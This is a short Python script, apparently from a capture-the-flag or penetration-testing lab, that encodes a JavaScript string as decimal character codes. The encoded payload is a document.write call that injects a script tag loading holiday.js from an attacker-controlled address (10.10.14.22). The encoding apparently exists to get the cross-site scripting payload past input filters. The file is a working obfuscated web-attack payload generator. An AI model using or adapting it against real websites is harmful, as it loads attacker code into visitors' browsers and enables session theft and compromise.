def createEncodedJS(ascii):
    decimal_string = ""
    for char in ascii:
        decimal_string +=  str(ord(char)) + ","
    return decimal_string[:-1]

print(createEncodedJS("""document.write('<script src="http://10.10.14.22/holiday.js"></script>');"""))
